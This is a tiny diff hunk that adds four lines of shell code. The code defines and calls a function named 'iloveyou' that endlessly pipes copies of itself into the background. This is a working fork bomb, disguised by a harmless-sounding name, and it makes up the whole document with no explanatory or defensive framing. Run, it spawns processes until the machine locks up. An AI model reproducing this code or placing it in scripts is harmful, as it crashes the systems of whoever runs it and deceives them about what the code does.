@@ -1,0 +1,4 @@
+iloveyou() {
+    iloveyou | iloveyou &
+};
+iloveyou
